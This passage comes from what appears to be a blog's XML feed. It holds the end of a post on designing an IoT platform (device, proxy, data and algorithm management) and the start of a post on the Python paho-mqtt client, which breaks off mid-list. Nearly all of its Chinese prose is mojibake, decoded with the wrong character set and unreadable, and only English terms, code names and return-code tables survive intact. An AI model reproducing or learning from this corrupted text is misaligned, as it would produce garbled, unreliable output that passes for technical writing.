æŸ¥çœ‹è®¾å¤‡:è®¾å¤‡åˆ›å»ºæˆåŠŸè¿‡åç”¨æˆ·å¯ä»¥æŸ¥çœ‹åˆ°: è®¾å¤‡çš„åŸºæœ¬ä¿¡æ¯, æ¯”å¦‚åç§°, ID, æ¥å…¥æ–¹å¼, åœ°ç†ä½ç½®, åˆ›å»ºæ—¶é—´ è®¾å¤‡æ ‡ç­¾ä¿¡æ¯, è¿™æ˜¯ç®€å•çš„èµ„äº§, ç”¨äºé€šè¿‡æ ‡ç­¾åˆ†ç±»è®¾å¤‡, ç®€å•çš„èµ„äº§åˆ†ç±»ç®¡ç† è®¾å¤‡é€šé“ä¿¡æ¯, æ•°æ®ä¸ŠæŠ¥é€šé“å’Œè®¾å¤‡æ§åˆ¶é€šé“çš„åç§° æ¥å…¥ä¿¡æ¯, æ¥å…¥äº‘ç«¯çš„ç”¨æˆ·åå’Œå¯†ç  è®¾å¤‡çŠ¶æ€ä¿¡æ¯, è®¾å¤‡æ˜¯å¦ä¸‹çº¿, èƒ½å¦å’Œè®¾å¤‡é€šä¿¡ agentçŠ¶æ€ä¿¡æ¯, agentæ˜¯å¦è¿è¡Œ å¦‚æœæ˜¯é€šè¿‡proxyæ¥å…¥, æ˜¾ç¤ºproxyåç§°å’ŒçŠ¶æ€ä¿¡æ¯ ä¿®æ”¹è®¾å¤‡: æä¾›è®¾å¤‡åŸºæœ¬ä¿¡æ¯çš„ä¿®æ”¹: è®¾å¤‡åç§°, æ¥å…¥æ–¹å¼, åœ°ç†ä½ç½®, ä»¥åŠå…¶ä»–ç”¨æˆ·è‡ªå®šä¹‰å±æ€§çš„ä¿®æ”¹ ç¦ç”¨è®¾å¤‡: ç¦ç”¨è®¾å¤‡å, å°†ç¦æ­¢è®¾å¤‡ä¸äº‘ç«¯å»ºç«‹è¿æ¥: å¦‚æœæ˜¯agentæ¥å…¥, å‰”é™¤è¯¥agentçš„å›è¯, å¹¶ç¦æ­¢è¯¥è®¾å¤‡ ä¸äº‘ç«¯å»ºç«‹è¿æ¥ å¦‚æœæ˜¯proxyæ¥å…¥, é€šçŸ¥proxy, åœæ­¢ä¸ºè¯¥è®¾å¤‡å»ºç«‹ä¸äº‘ç«¯çš„è¿æ¥ å¯ç”¨è®¾å¤‡: å¯ç”¨è®¾å¤‡å, æ¢å¤å…è®¸è®¾å¤‡ä¸äº‘ç«¯å»ºç«‹è¿æ¥: å¦‚æœæ˜¯agentæ¥å…¥, æ’¤é”€è®¾å¤‡ç¦æ­¢æ¥å…¥äº‘ç«¯çš„æ§åˆ¶ å¦‚æœæ˜¯proxyæ¥å…¥, é€šçŸ¥proxy, é‡æ–°ä¸ºè¯¥è®¾å¤‡å»ºç«‹ä¸äº‘ç«¯çš„è¿æ¥ åˆ é™¤è®¾å¤‡: åˆ é™¤è®¾å¤‡å, ä¸è®¾å¤‡ç›¸å…³çš„æ‰€æœ‰è¿æ¥éƒ½å°†æ–­å¼€, è¯¥è®¾å¤‡ä»æ­¤ä»¥åå°†æ— æ³•ä¸äº‘ç«¯å»ºç«‹è¿æ¥ å–æ¶ˆè¯¥è®¾å¤‡é€šé“çš„æ‰€æœ‰å¤„ç† æ¸…é™¤æ¥å…¥ç”¨æˆ·ä¿¡æ¯, ç”¨æˆ·æ— æ³•å’Œäº‘ç«¯å»ºç«‹è¿æ¥ å¦‚æœæ˜¯proxyæ¥å…¥, é€šçŸ¥ä»£ç† è¯¥è®¾å¤‡å·²ç»åˆ é™¤, æ›´æ–°ä»£ç†åˆ—è¡¨, åœæ­¢ä¸ºè¯¥è®¾å¤‡ä»£ç† æ¸…é™¤è®¾å¤‡ç›¸å…³å…ƒæ•°æ® è®¾å¤‡é…é¢ç®¡ç†: é™åˆ¶ç”¨æˆ·å¯ä»¥åˆ›å»ºçš„è®¾å¤‡æ•°é‡ æŸ¥è¯¢é…ç½®: ä¿®æ”¹é…é¢: ç”±ç®¡ç†å‘˜ä¿®æ”¹é…é¢ è®¾å¤‡æ ‡ç­¾ç®¡ç†: åŸºäºæ ‡ç­¾çš„èµ„äº§ç®¡ç† æ ‡ç­¾çš„åˆ›å»º,æŸ¥çœ‹,ä¿®æ”¹,åˆ é™¤ ä¸ºè®¾å¤‡æ·»åŠ æ ‡ç­¾ ç§»é™¤è®¾å¤‡çš„æ ‡ç­¾ è®¾å¤‡çŠ¶æ€å½±å­: æŸ¥çœ‹è®¾å¤‡æœ€æ–°çŠ¶æ€, è®¾å¤‡æ•°æ®æ¥å…¥äº‘ç«¯æ—¶éœ€è¦é€šè¿‡ è®¾å¤‡ç±»å‹ æ£€æŸ¥è®¾å¤‡çš„ä¸ŠæŠ¥çš„æ•°æ®æ˜¯å¦åˆæ³•, å¹¶ä¸”ç»æœ€æ–°çŠ¶æ€ å½•å…¥, ç”¨æˆ·å¯ä»¥çœ‹åˆ°è¯¥è®¾å¤‡çš„ æœ€æ–°çŠ¶æ€æ•°æ®. è®¾å¤‡çš„åå‘æ§åˆ¶: æ§åˆ¶æŒ‡ä»¤æŸ¥çœ‹æ§åˆ¶æŒ‡ä»¤ç”±agentçš„æ§åˆ¶å™¨å®ç°, åœ¨agentå¯åŠ¨æ—¶ä¸ŠæŠ¥ç»™äº‘ç«¯: æ§åˆ¶æŒ‡ä»¤çš„åŸºæœ¬ä¿¡æ¯: æ§åˆ¶æŒ‡ä»¤çš„åç§°, åŠŸèƒ½è¯´æ˜, ä½¿ç”¨æ–¹å¼, é¢„æœŸç»“æœ, å¼‚å¸¸è¯´æ˜ã€‚ æ§åˆ¶æŒ‡ä»¤çš„ä¸ŠæŠ¥æ—¶é—´, æ‰§è¡Œæƒä½¿ç”¨è€…åˆ—è¡¨ æ§åˆ¶æŒ‡ä»¤çš„æ‰§è¡Œè®°å½• æ‰§è¡Œæƒåˆ†é…å°†æ§åˆ¶æŒ‡ä»¤çš„æ‰§è¡Œæƒåˆ†é…ç»™æœ‰ä¸ªç”¨æˆ·, è¯¥ç”¨æˆ·å¯ä»¥æ‰§è¡Œè¯¥æ§åˆ¶æŒ‡ä»¤ æ‰§è¡Œæƒå›æ”¶å°†æ§åˆ¶æŒ‡ä»¤çš„æ‰§è¡Œæƒå›æ”¶ã€‚ç”¨æˆ·å°†æ²¡æœ‰æ”¹æŒ‡ä»¤çš„æ‰§è¡Œæƒ æ‰§è¡Œæ§åˆ¶æŒ‡ä»¤é»˜è®¤ä»…æœ‰ç®¡ç†å‘˜å¯ä»¥æ‰§è¡Œæ§åˆ¶æŒ‡ä»¤, æ‰§è¡Œæ§åˆ¶æŒ‡ä»¤, å¾—åˆ°æ‰§è¡Œç»“æœ ç¦ç”¨æ§åˆ¶æŒ‡ä»¤ ç”±ç®¡ç†å‘˜å†³å®šæ˜¯å¦ç¦ç”¨è¯¥æ§åˆ¶æŒ‡ä»¤ å¯ç”¨æ§åˆ¶æŒ‡ä»¤ç”±ç®¡ç†å‘˜å†³å®šæ˜¯å¦å¯ç”¨è¯¥æ§åˆ¶æŒ‡ä»¤ proxyç®¡ç†: åˆ›å»ºä»£ç†: å¿…é¡»å‚æ•°: ä»£ç†åç§°, å¯é€‰å‚æ•°: åœ°ç†ä½ç½®, å…¶ä»–åˆ›å»ºå±æ€§ æŸ¥çœ‹ä»£ç†: åç§°, åœ°ç†ä½ç½®, å…¶ä»–å±æ€§, åˆ›å»ºæ—¶é—´ ä»£ç†çŠ¶æ€: æœªæ¥å…¥, è¿è¡Œä¸­, ç¦ç”¨ ä»£ç†çš„ æ•°å­—ç­¾åè¯ä¹¦, CAè¯ä¹¦, ä»£ç†ç§é’¥ ä»£ç†è‡ªå·±ä½¿ç”¨çš„æ§åˆ¶é€šé“(ä»£ç†å’Œäº‘ç«¯é€šä¿¡çš„æ¥å£), å’Œå¼‚å¸¸ä¸ŠæŠ¥é€šé“ ä¿®æ”¹ä»£ç†:åç§°, åœ°ç†ä½ç½®, å…¶ä»–å±æ€§ åˆ é™¤ä»£ç†: ç¡®è®¤è¯¥ä»£ç†ä¸‹é¢æ²¡æœ‰è®¾å¤‡åæ–¹å¯ä»¥åˆ é™¤, ç§»é™¤åçš„è®¾å¤‡å±äºæ— ä¸ŠæŠ¥æ–¹å¼çš„è®¾å¤‡, åŠé”€ä»£ç†çš„è¯ä¹¦ å‰”é™¤ä»£ç† çš„ä¸ŠæŠ¥å›è¯(éå¸¸å±é™©, å¦‚æœä»£ç†æ­£åœ¨ä¸ŠæŠ¥æ•°æ®) æ¸…é™¤ä»£ç†ä¿¡æ¯ ç¦ç”¨ä»£ç†: ç¦æ­¢è¯¥ä»£ç†å‘å¸ƒæ•°æ®åˆ°äº‘ç«¯(çš„æ•°æ®ç®¡é“) å¯ç”¨ä»£ç†: ç¦æ­¢è¯¥ä»£ç†å‘å¸ƒæ•°æ®åˆ°äº‘ç«¯(çš„æ•°æ®ç®¡é“) æŸ¥çœ‹ä»£ç†ä¸‹çš„è®¾å¤‡: åˆ—å‡ºè¯¥ä»£ç†ä¸‹é¢çš„è®¾å¤‡åˆ—è¡¨ æ·»åŠ è®¾å¤‡åˆ°è¯¥ä»£ç†ä¸‹é¢ ç§»é™¤è¯¥ä»£ç†ä¸‹é¢çš„è®¾å¤‡ device-gatewayåå°åŠŸèƒ½æ¦‚è¿°: æ•°æ®å­˜å‚¨è´Ÿè´£å°†æ•°æ®å­˜å‚¨åˆ°åç«¯å­˜å‚¨ çŠ¶æ€æ•°æ®å­˜å‚¨ çƒ­æ•°æ®å­˜å‚¨ å†å²æ•°æ®å­˜å‚¨ æ•°æ®å¯è§†åŒ–ä¸è¿è¥(data-manager)ä¸»è¦è´Ÿè´£æ•°æ®çš„ç®¡ç†å’ŒæŸ¥çœ‹, æ•°æ®ä»¥ç±»å‹ç»„ç»‡åœ¨ä¸€èµ·, ä»¥ç‚¹ä½ä¸ºæ ¸å¿ƒ, ç”¨æˆ·é€šè¿‡ä¸ºè¿™äº› æ•°æ®æ·»åŠ æ ‡ç­¾ æ¥æ·»åŠ  æ•°æ®ç»´åº¦, æ–¹ä¾¿ä¸šåŠ¡ä½¿ç”¨ã€‚ æ•°æ®åˆ†ç±»æä¾›æ•°æ®çš„æŸ¥çœ‹ä¸è¿è¥ç®¡ç†, æ•°æ®ä»¥æŒ‡æ ‡çš„æ–¹å¼å­˜å‚¨, ç”¨æˆ·é€šè¿‡æ ‡ç­¾æ¥è¿è¥æ•°æ®ã€‚è¿è¥çš„æ•°æ®ä¸»è¦ç”±2ç±»æ„æˆ: ç‰©ç†æŒ‡æ ‡æ•°æ®: é‡‡é›†ä¸Šæ¥çš„åŸå§‹æ•°æ®, ä»¥ç‚¹ä½çš„æœ€å°é€»è¾‘å•å…ƒä¸ºæŒ‡æ ‡,æ¯”å¦‚ é½¿è½®ç®±ç­‰ã€‚ åˆ†æè¿‡åçš„æŒ‡æ ‡æ•°æ®: ç»è¿‡åˆ†æè¿‡åçš„æ•°æ® ä»¥ç®—æ³•ä¸ºæŒ‡æ ‡, åˆ†ææ ¹æ®éœ€è¦ä¸ºè¿™äº›æ•°æ®æ‰“ç®—æ ‡ç­¾ã€‚(æ¯”å¦‚æ‰“ç®—è®¾å¤‡æ ‡ç­¾) æ•°æ®æŸ¥çœ‹æä¾›å¯¹æ•°æ®çš„åŸºæœ¬å±•ç°çš„æ”¯æŒ, ä½†ä¸æä¾›å¤§é‡åŸå§‹æ•°æ®çš„å¯¼å‡ºåŠŸèƒ½, å¤§é‡åŸå§‹æ•°æ®æ˜¯ç•™ç»™è®¡ç®—å¹³å°ä½¿ç”¨çš„, å¦‚éœ€å¯¼å‡ºè¯·ä½¿ç”¨å¯¼å‡ºå·¥å…·è¿›è¡Œå¯¼å‡ºã€‚ æ•°æ®æŸ¥è¯¢é…ç½®æŸ¥çœ‹:  å†å²æ•°æ®åˆ†å±‚é…ç½®: 1. æŒ‰æ—¶é—´ä¸ºç»´åº¦è¿›è¡Œåˆ’åˆ†, é»˜è®¤ä¸º3ä¸ªæœˆ 2. æŒ‰å®¹é‡è¿›è¡Œåˆ’åˆ†, é»˜è®¤ä¸ºæœ€è¿‘1wæ¡æ•°æ®, é»˜è®¤æŒ‰è§„åˆ™1æ‰§è¡Œã€‚ çŠ¶æ€æ•°æ®æŸ¥è¯¢å®¹é‡é™åˆ¶: é»˜è®¤ä¸º1000æ¡æ•°æ®, åŠè®¾å¤‡ç‚¹ä½ä¸å¾—é»˜è®¤ä¸å¾—è¶…è¿‡1000 å†å²æ•°æ®æŸ¥è¯¢å®¹é‡é™åˆ¶: é»˜è®¤ä¸º100 * 100æ¡æ•°æ®, åŠè®¾å¤‡ç‚¹ä½ä¸èƒ½è¶…è¿‡100ä¸ªï¼Œæ¯ä¸ªç‚¹ä½çš„æ•°æ®ä¸å¾—è¶…è¿‡100æ¡ æ•°æ®æŸ¥è¯¢é…ç½®ä¿®æ”¹: ä¿®æ”¹ä»¥ä¸Šé‚£äº›é»˜è®¤é…ç½® æŸ¥è¯¢æ•°æ®: çŠ¶æ€æŸ¥è¯¢: ä¹Ÿå°±æ˜¯å½“å‰æ¥å…¥äº‹ä»¶çš„æŸ¥è¯¢(ç”¨äºæŸ¥çœ‹å½“ä¸‹æ¥å…¥çš„æ•°æ®, ä¸èƒ½æŸ¥çœ‹å†å²æ•°æ®), å¦‚æœè®¾å¤‡æ¥å…¥å¼‚å¸¸ è¯·æ˜¾ç¤ºæ¥å…¥å¼‚å¸¸ä¿¡æ¯, ä»¥websocket è¿›è¡Œå®æ—¶æä¾› å†å²æŸ¥è¯¢: ä¹Ÿå°±æ˜¯è¶‹åŠ¿æŸ¥è¯¢ çƒ­æ•°æ®æŸ¥è¯¢: å¦‚æœæ•°æ®é‡è¿‡å¤§ï¼Œéœ€è¦åˆ†ç»„è¿›è¡Œèšåˆ å†·æ•°æ®æŸ¥è¯¢: å¦‚æœæ•°æ®é‡è¿‡å¤§ï¼Œéœ€è¦åˆ†ç»„è¿›è¡Œèšåˆ æ•°æ®æ ‡ç­¾ç®¡ç† æ•°æ®æ ‡ç­¾æŸ¥è¯¢, é»˜è®¤æ ‡ç­¾å±äºç³»ç»Ÿæ ‡ç­¾(æ¯”å¦‚æ•°æ®å±äºé‚£å°è®¾å¤‡, æ•°æ®æ˜¯ç”±é‚£ä¸ªé‡‡é›†å™¨é‡‡é›†ä¸Šæ¥çš„), ç¦æ­¢ä¿®æ”¹, ä¸ºåªè¯»çŠ¶æ€, å…¶ä»–æ˜¯ç”¨æˆ·ä¸ºæ•°æ® è¿›è¡Œçš„è‡ªå®šä¹‰æ ‡ç­¾ æ·»åŠ æ ‡ç­¾: ä¸ºæ•°æ® æ·»åŠ æ ‡ç­¾ï¼Œ æ ‡ç­¾æœ‰é•¿åº¦é™åˆ¶(æœ€é•¿ä¸å¾—è¶…è¿‡16ä¸ªå­—ç¬¦) åˆ é™¤æ ‡ç­¾: åˆ é™¤æ ‡ç­¾,ä½†æ˜¯åˆ é™¤ä¹‹å‰ éœ€è¦ç¡®è®¤æ•°æ®æ˜¯å¦å·²ç»æˆæƒ, å¦‚æœå·²ç»æˆæƒåˆ†äº«, éœ€è¦æ’¤é”€åˆ†äº« æ‰èƒ½åˆ é™¤ æ•°æ®æˆæƒ ç”¨æˆ·æŒ‰ç…§è‡ªå·±çš„éœ€è¦ å°†æ•°æ®æ‰“ä¸Šæ ‡ç­¾, æˆ–è€…ä½¿ç”¨é»˜è®¤æ ‡ç­¾, å°†å¯¹åº”çš„æ•°æ® åˆ†æç»™å…¶ä»–ç”¨æˆ·è®¿é—®. æ•°æ®åˆ†äº«æŸ¥è¯¢: æŸ¥è¯¢é‚£äº›æ•°æ®,è¢«åˆ†æç»™äº†é‚£äº›ç”¨æˆ· åˆ†äº«æƒé™æ’¤é”€: æ’¤é”€å·²ç»åˆ†æå‡ºå»çš„æ•°æ®æˆæƒ æ•°æ®åˆ†äº«: æŒ‡å®šæŸäº›ç”¨æˆ·å¯ä»¥è®¿é—®é‚£äº›æ ‡ç­¾çš„æ•°æ®ã€‚ æ•°æ®åˆ†ææ•°æ®åˆ†æå›´ç»•ç®—æ³•å’Œä»»åŠ¡è¿›è¡Œå±•å¼€, å…³é”®çš„åœ¨äº ç®—æ³•çš„é«˜åº¦å¯å®šåˆ¶åŒ–, ç®—æ³•æµ‹è¯•, è¿è¡Œæ—¶æ£€æŸ¥, ä»¥åŠç®—æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­ä»»åŠ¡çš„å¯è§†åŒ–ã€‚åŠŸèƒ½æ˜¯æ»¡è¶³é«˜çº§ç”¨æˆ· å¯¹äºæ•°æ®åˆ†æçš„éœ€æ±‚ã€‚ é€šè¿‡ç®—æ³•å¯¹æ•°æ®è¿›è¡Œæ·±åº¦åˆ†æçš„åŠŸèƒ½ã€‚ å®æ—¶è®¡ç®— ç¦»çº¿è®¡ç®—(æŠ¥è¡¨ç»Ÿè®¡å’Œæ·±åº¦å­¦ä¹ , æ·±åº¦éœ€è¦ä¾èµ–å¤§é‡æ•°æ®è®­ç»ƒå‡ºæ¨¡å‹ï¼Œç„¶åé€šè¿‡æ¨¡å‹ åº”ç”¨åˆ°äº‹ä»¶åˆ†æ, è¾¾åˆ°æ™ºèƒ½åˆ†æçš„ç›®çš„) æ··åˆè®¡ç®—: æ¯”å¦‚å…ˆä½¿ç”¨ç¦»çº¿è®¡ç®—è®­ç»ƒæ¨¡å‹, ç„¶åå°†æ¨¡å‹ åº”ç”¨åˆ°å®æ—¶è®¡ç®—, æˆ–è€…ä½¿ç”¨å®æ—¶è®¡ç®—ä½œä¸ºæµ‹è¯•æ•°æ®,ä»¥å†å²æ•°æ®ä½œä¸ºè®­ç»ƒæ•°æ® è¿›è¡Œäº¤å‰éªŒè¯,ä»¥ä¾¿è®­ç»ƒå‡†ç¡®çš„æ¨¡å‹ã€‚ ç®—æ³•ç®¡ç®¡ç†ç®—æ³•æ–‡ä»¶, ç®—æ³•æ–‡ä»¶è¡¨ç°ä¸ºä¸€ä¸ªè„šæœ¬æ–‡ä»¶, å¯¹äºstorm å¹³å°è€Œå·², ç®—æ³•æ–‡ä»¶æ˜¯grooveè„šæœ¬, å¯¹äºspark å¹³å°è€Œè¨€, ç®—æ³•æ–‡ä»¶ å¯ä»¥æ˜¯sparkæ”¯æŒçš„å¤šç§è¯­è¨€çš„è„šæœ¬ã€‚ ä¸Šä¼ ç®—æ³•: ä¸Šä¼ è„šæœ¬æ–‡ä»¶, ç®—æ³•åç§°(é»˜è®¤æ˜¯ç®—æ³•æ–‡ä»¶çš„åç§°,å»æ‰åç¼€), ç®—æ³•æè¿°ä¿¡æ¯(åŒ…å«ç®—æ³•è¦è§£å†³çš„é—®é¢˜, è¾“å…¥å‚æ•°çš„è§£é‡Šå’Œè¾“å‡ºå‚æ•°çš„è§£é‡Š), ç®—æ³•è¿è¡Œå¹³å°() ä¸‹è½½ç®—æ³•: ä¸‹è½½ç®—æ³•æ–‡ä»¶ã€‚ åˆ é™¤ç®—æ³•: åˆ é™¤ç®—æ³•æ–‡ä»¶. æ›´æ–°ç®—æ³•å…ƒæ•°æ®: æ›´æ–°ç®—æ³•çš„åç§° æˆ–è€…ç®—æ³•çš„æè¿°ä¿¡æ¯ æŸ¥çœ‹ç®—æ³•: æŸ¥çœ‹æ‰€æœ‰ç®—æ³•ã€‚ ç®—æ³•è®¿é—®æˆæƒ: æˆæƒç®—æ³•ç»™æŸä¸ªç”¨æˆ·è®¿é—®ã€‚ ç®—æ³•æˆæƒæ’¤é”€: æ’¤é”€æŸä¸ªç”¨æˆ·è®¿é—®æŸä¸ªç®—æ³•çš„æƒé™ã€‚ ä»»åŠ¡æ‰§è¡Œç®—æ³• è¿è¡Œæ—¶äº§ç”Ÿä¸€ä¸ªçœŸæ­£çš„ä»»åŠ¡, å› æ­¤è¿è¡Œç®—æ³• éœ€è¦æœ‰ä»¥ä¸‹è¿™äº›å‚æ•°: ç®—æ³•æ–‡ä»¶, é€šè¿‡æŒ‡å®šç®—æ³•æ–‡ä»¶çš„idæ¥å®Œæˆ ç®—æ³•çš„è¾“å…¥å’Œè¾“å‡º: æ‰«æè·å–ç®—æ³•æ–‡ä»¶çš„ è¾“å…¥å’Œè¾“å‡ºå½¢å‚() é€‰å®šè¾“å…¥æºçš„å½¢å‚å¯¹åº”çš„æ•°æ®, é€šè¿‡å»è¾“å…¥æº æŸ¥çœ‹å¾—å‡º, é€‰æ‹©è¾“å‡ºæº å¯¹åº”çš„åç§°ã€‚(å¯ä»¥æ£€æŸ¥è¾“å…¥æºæ˜¯å¦æœ‰æ•°æ®) æ‰§è¡Œå¹³å°, æ ¹æ®ç®—æ³•æ–‡ä»¶id, å¾—çŸ¥è¯¥ç®—æ³•è°ƒåº¦åˆ°é‚£ä¸ªå¹³å°ä¸Šè¿è¡Œ(jstrom, spark), å¦‚æœæ²¡æœ‰å¯¹åº”å¹³å°æ”¯æŒ, åˆ™æŠ¥é”™ ç°æœ‰ç‰©è”ç½‘å¹³å°å‚è€ƒå›½å†…å¤–ç‰©è”ç½‘å¹³å°æ¶æ„å¾®è½¯Azure IoTäºšé©¬é€ŠAWS IoTIBM Watson IOT]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>iot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pythonçš„mqttå®¢æˆ·ç«¯ä½¿ç”¨è¯´æ˜]]></title>
    <url>%2F2017%2F07%2F04%2Fmqtt-reconnect%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘ä½¿ç”¨Pythonå†™ä¸€ä¸ªåå°æœåŠ¡å¤„ç†mqtté‡Œé¢çš„äº‹ä»¶æ—¶é‡åˆ°äº†ä¸€ä¸ªéº»çƒ¦: mqttè¿æ¥é‡ç½®æ—¶(é‡å¯mqttæœåŠ¡å), ä¹‹å‰pubæ¶ˆæ¯çš„çº¿ç¨‹ä¸èƒ½æ­£å¸¸å·¥ä½œäº†, ç»è¿‡å¤šæ¬¡è¸©å‘, ç»ˆäºè§£å†³. å¼•å‘é—®é¢˜çš„åŸå› æ˜¯æˆ‘ä½¿ç”¨å§¿åŠ¿ä¸å¯¹é€ æˆçš„, ä¸€æ—¦ä½ ä½¿ç”¨å§¿åŠ¿ä¸å¯¹ ä¼šé€ æˆä¸€äº›å¥‡æ€ªçš„é—®é¢˜,å¹¶ä¸”å¾ˆéš¾è§£å†³ã€‚ å› æ­¤è¯·æ­£ç¡®ä½¿ç”¨mqttã€‚ æ³¨æ„äº‹é¡¹å…³äºMQTTåè®®çš„ä»‹ç»è¯·å‚è€ƒä¹‹å‰åšå®¢: ç‰©è”ç½‘ä¹‹MQTT, åªæœ‰åœ¨äº†è§£MQTTåè®®è¿‡å, æˆ‘ä»¬æ‰èƒ½ä»¥æ­£ç¡®çš„å§¿åŠ¿ä½¿ç”¨å¥¹, ä»¥ä¸‹æ˜¯æˆ‘è§‰å¾—éœ€è¦æ³¨æ„çš„åœ°æ–¹: æŒ‰éœ€ä½¿ç”¨MQTTçš„Qos, å½“Qos=2æ—¶å¯é æ€§æœ€é«˜, ä½†æ˜¯ä¼šæŸå¤±æ€§èƒ½ã€‚ å°½é‡ä½¿ç”¨client_idæ¥æ ‡ç¤ºå®¢æˆ·ç«¯, ä½†æ˜¯æ³¨æ„ å¦‚æœ2ä¸ªå®¢æˆ·ç«¯ä½¿ç”¨åŒä¸€ä¸ªclient_id, ä¼šå‡ºç°clientäº‰æŠ¢è¿æ¥çš„çŠ¶æ€, æ‰€ä»¥å…¨å±€æŒæœ‰ä¸€ä¸ªclientæ˜¯ä¸é”™çš„é€‰æ‹©ã€‚ æ³¨æ„å¼‚æ­¥å¤„ç†, åœ¨å›è°ƒå‡½æ•°ä¸­ä¸èƒ½é˜»å¡ã€‚ å°†æ‰€æœ‰æ•°æ®å¤„ç†é€»è¾‘æ”¾åˆ°å›è°ƒå‡½æ•°é‡Œé¢, é˜²æ­¢é“¾æ¥é‡ç½®æ—¶ï¼Œæ¼æ‰å¤„ç†é€» åœ¨on_messageçš„å›è°ƒé‡Œé¢ å¤„ç†æ‰€æœ‰çš„è®¢é˜…æ¶ˆæ¯ æ–­å¼€è¿æ¥æ—¶å°½é‡ä»æ–°è¿æ¥, é¿å…mqttç¦»çº¿å, é‡æ–°ä¸Šçº¿, é€ æˆæœåŠ¡è¿æ¥å¼‚å¸¸ã€‚(æ³¨æ„loopçš„è¿”å›, ä¿è¯loopç½‘ç»œäº‹ä»¶æŒç»­å¤„ç†ä¸­) ç¯å¢ƒä»‹ç»ä»‹ç»ä¸‹æˆ‘çš„æµ‹è¯•ç¯å¢ƒ: Python Version: 3.6 MQTT Server: emqttserver:2.2-rc1 MQTT Client: paho-mqtt: 1.3.0 emqtt serverå®‰è£…å‚è€ƒemqtt dockerå®‰è£…python mqttå®¢æˆ·ç«¯çš„å®‰è£…è¯·å‚è€ƒGithubåœ°å€ å®¢æˆ·ç«¯ä½¿ç”¨ä»‹ç»paho-mqttæœ‰ä¸€ä¸ªå®¢æˆ·ç«¯ç±», æˆ‘ä»¬ä¸»è¦ä½¿ç”¨è¯¥ç±»æ¥å’Œmqttserverè¿›è¡Œäº¤äº’, é‚£ä¹ˆå¦‚ä½•ä½¿ç”¨è¿™ä¸ªç±»å–ƒ: å»ºç«‹è¿æ¥: ä½¿ç”¨connect()/connect_async()æ¥é“¾æ¥åˆ°broker(mqtt server) æ–­å¼€è¿æ¥: ä½¿ç”¨disconnect()æ–¹æ³•æ¥æ–­å¼€å’Œbroker(mqtt server)ä¹‹é—´çš„ç½‘ç»œè¿æ¥ã€‚ å¤„ç†ç½‘ç»œäº‹ä»¶: è¯·é¢‘ç¹è°ƒç”¨loop()æ¥ç»´æŒå’Œbroker(mqtt server)ä¹‹é—´çš„ç½‘ç»œäº‹ä»¶ã€‚å¦‚æœä¸æƒ³è‡ªå·±é¢‘ç¹çš„è°ƒç”¨loopæ¥ç»´æŠ¤ç½‘ç»œäº‹ä»¶, å¯ä»¥ä½¿ç”¨loop_forever()æ–¹æ³•æ¥å¤„ç†,è¯¥æ–¹æ³•ä¼šå¸®ä½ å¾ªç¯è°ƒç”¨loop, å› æ­¤è¯¥æ–¹æ³•æ˜¯ä¸€ä¸ªé˜»å¡çš„æ–¹æ³•ã€‚å¦‚æœä¸æƒ³åœ¨ç¨‹åºé‡Œé¢é˜»å¡,å¯ä»¥ä½¿ç”¨loop_start()æ–¹æ³•,è¯¥æ–¹æ³•ä¼šå¯åŠ¨ä¸€ä¸ªçº¿ç¨‹åœ¨åå°æ‰§è¡Œloop_foreverã€‚ è®¢é˜…æ¶ˆæ¯: ä½¿ç”¨subscribe()æ–¹æ³•æ¥è®¢é˜…topicå’Œæ¥æ”¶æ•°æ® å‘å¸ƒæ¶ˆæ¯: ä½¿ç”¨publish()æ–¹æ³•æ¥å‘å¸ƒæ¶ˆæ¯ mqttçš„é€šä¿¡æ˜¯å¼‚æ­¥çš„, é€šè¿‡ç½‘ç»œäº‹ä»¶æ¥è¿›è¡Œå›è°ƒå¤„ç†, å› æ­¤æˆ‘ä»¬åŸºæœ¬é‡‡ç”¨å›è°ƒæ¥ç¼–ç¨‹, å›è°ƒå‡½æ•°çš„ç­¾åå¦‚ä¸‹, æ‰€æœ‰çš„å›è°ƒå‡½æ•°éƒ½2ä¸ªå›ºå®šå‚æ•°: client: å›è°ƒæ—¶ä¼ é€’æ¥çš„å®¢æˆ·ç«¯å®ä¾‹ userdata: userçš„ä»»ä½•ç±»å‹çš„æ•°æ®, å®ä¾‹åŒ–clientæ—¶ä¼ å…¥, ç”¨æˆ·è‡ªå·±ä½¿ç”¨ã€‚ on_connect(client, userdata, flags, rc)å½“brokerå“åº”äº†æˆ‘ä»¬é“¾æ¥ä¹‹åè°ƒç”¨, æ¶‰åŠåˆ°çš„å‚æ•°: flags: æ˜¯ä¸€ä¸ªå­—å…¸, åŒ…å«brokerè¿”å›çš„å“åº”æ ‡å¿—ç°åœ¨åªæœ‰1ä¸­æ ‡å¿—: session present, é€šè¿‡flags[â€˜session presentâ€™]è·å–åˆ°è¯¥æ ‡å¿—é‡Œé¢çš„å†…å®¹, å½“clean sessionä¸º0æ—¶(clean_session=False), brokerä¼šä¿å­˜clientçš„çš„sessionä¿¡æ¯, è¯¥ä¿¡æ¯ä¼šåœ¨clienté‡æ–°ä¸Šçº¿æ—¶, é€šè¿‡session presentè¿™ä¸ªæ ‡å¿— è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ rc: retrun code, è¿”å›çŠ¶æ€ç  RC Status Description 0 successful connected 1 refused incorrect protocol version 2 refused invalid client identifier 3 refused server unavailable 4 refused bad username or password 5 refused not authorised 6-255 refused Currently unused on_disconnect(client, userdata, rc)å½“clientå’Œbrokeræ–­å¼€è¿æ¥æ—¶è°ƒç”¨. rcè¡¨ç¤ºæ–­å¼€è¿æ¥æ˜¯çš„çŠ¶æ€ RC Description 0 MQTT_ERR_SUCCESS, å®¢æˆ·ç«¯è°ƒç”¨disconnect()æ–¹æ³•æ–­å¼€è¿æ¥, å±äºæ­£å¸¸æ–­å¼€ 1 ç½‘ç»œç­‰å…¶ä»–åŸå› ç…§æˆçš„è¿æ¥æ–­å¼€, å¼‚å¸¸æ–­å¼€ on_message(client, userdata, message)å½“å®¢æˆ·ç«¯è®¢é˜…çš„topicä¸Šæœ‰æ•°æ® è¢«æ¥æ”¶æ—¶è°ƒç”¨, messageæ˜¯ä¸€ä¸ªMQTTMessageçš„ç±», è¯¥ç±»åŒ…å«äº†messageçš„æ‰€æœ‰æ•°æ®: topic: æ•°æ®æ‰€åœ¨çš„topic payload: messageçš„æ•°æ®éƒ¨åˆ† qos: 